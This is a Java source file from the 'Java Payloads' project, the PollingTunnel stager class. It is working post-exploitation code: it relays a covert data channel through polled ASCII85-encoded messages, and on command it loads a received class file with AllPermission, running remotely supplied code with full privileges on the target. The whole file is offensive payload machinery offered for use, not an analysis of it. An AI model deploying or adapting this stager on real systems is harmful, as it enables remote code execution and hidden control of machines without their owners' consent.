/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.stager;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;

public class PollingTunnel extends Stager implements Runnable {

	private PipedOutputStream localOut;
	private PipedInputStream localIn;
	private String[] parameters;
	private byte[][] readBuffer;
	private boolean done = false;
	private boolean ready;
	private Class wposClass = null;

	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
		localOut = new PipedOutputStream();
		/* #JDK1.6 */try {
			localIn = new PipedInputStream(4096);
		} catch (NoSuchMethodError ex) /**/{
			localIn = new PipedInputStream();
		}
		this.parameters = parameters;
		new Thread(this).start();
		waitReady();
		while (parameters[parameters.length - 1].equals("-WAITLOOP-") && !done)
			waitloop();
	}

	private void waitloop() throws Exception {
		Thread.sleep(100);
	}

	public void run() {
		try {
			if (readBuffer == null) {
				readBuffer = new byte[1][];
				PipedOutputStream pos = new PipedOutputStream(localIn);
				new Thread(this).start();
				synchronized(this) {
					ready = true;
					notifyAll();
				}
				PipedInputStream pipedIn;
				/* #JDK1.6 */try {
					pipedIn = new PipedInputStream(localOut, 4096);
				} catch (NoSuchMethodError ex) /**/{
					pipedIn = new PipedInputStream(localOut);
				}
				synchronized(this) {
					while (wposClass == null) 
						wait();
				}
				OutputStream wpos = (OutputStream) wposClass.getConstructor(new Class[] { PipedOutputStream.class }).newInstance(new Object[] { pos });
				bootstrap(pipedIn, wpos, parameters);
			} else {
				runReaderThread(readBuffer, localIn);
			}
		} catch (Exception ex) {
			/* #JDK1.4 */try {
				throw new RuntimeException(ex);
			} catch (NoSuchMethodError ex2) /**/{
				throw new RuntimeException(ex.toString());
			}
		}
	}

	public static void runReaderThread(byte[][] readBuffer, InputStream pipedIn) throws IOException, InterruptedException {
		byte[] buffer = new byte[4096];
		int len;
		while ((len = pipedIn.read(buffer, 0, buffer.length)) != -1) {
			if (len == 0)
				continue;
			synchronized (readBuffer) {
				while (readBuffer[0] != null)
					readBuffer.wait();
				readBuffer[0] = new byte[len];
				System.arraycopy(buffer, 0, readBuffer[0], 0, len);
				readBuffer.notifyAll();
			}
		}
		synchronized (readBuffer) {
			while (readBuffer[0] != null)
				readBuffer.wait();
			readBuffer[0] = new byte[0];
			readBuffer.notifyAll();
		}
	}

	public String sendData(String data) throws IOException {
		if (data.startsWith("1")) {
			byte[] rawData = decodeASCII85(data.substring(1));
			localOut.write(rawData);
			localOut.flush();
			if (rawData.length == 0) {
				localOut.close();
			}
		} else if (data.startsWith("9")) {
			byte[] classfile = decodeASCII85(data.substring(1));
			final Permissions permissions = new Permissions();
			permissions.add(new AllPermission());
			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
			synchronized(this) {
				resolveClass(wposClass = defineClass(null, classfile, 0, classfile.length, pd));
				notifyAll();
			}
			return "9";
		} else if (!data.equals("0")) {
			throw new IllegalArgumentException(data);
		}
		byte[] read;
		synchronized (readBuffer) {
			read = readBuffer[0];
			if (readBuffer[0] != null) {
				readBuffer[0] = null;
				readBuffer.notifyAll();
			}
		}
		if (read == null)
			return "0";
		if (read.length == 0) {
			localOut.close();
			done = true;
		}
		return "1" + encodeASCII85(read);
	}

	public static String encodeASCII85(byte[] data) {
		int offBytes = (4 - data.length % 4) % 4;
		StringBuffer sb = new StringBuffer();
		for (int i = 0; i < data.length + offBytes; i += 4) {
			long val = 0;
			for (int j = 0; j < 4; j++) {
				val *= 256;
				if (i + 3 - j < data.length) {
					val += (data[i + 3 - j] & 0xff);
				}
			}
			for (int j = 0; j < 5; j++) {
				sb.append((char) ((val % 85) + '#'));
				val /= 85;
			}
		}
		String result = sb.toString().replace('\\', '~');
		return result.substring(0, result.length() - offBytes);
	}

	public static byte[] decodeASCII85(String data) {
		int offBytes = (5 - data.length() % 5) % 5;
		String rawData = data.replace('~', '\\') + "####".substring(0, offBytes);
		byte[] result = new byte[(rawData.length()) / 5 * 4 - offBytes];
		for (int i = 0; i < rawData.length() / 5; i++) {
			long val = 0;
			for (int j = 0; j < 5; j++)
				val = val * 85 + (rawData.charAt(i * 5 + 4 - j) - '#');
			for (int j = 0; j < 4; j++) {
				if (i * 4 + j < result.length)
					result[i * 4 + j] = (byte) val;
				val >>= 8;
			}
		}
		return result;
	}
	
	public synchronized void waitReady() throws InterruptedException {
		while (!ready)
			wait();
	}
}
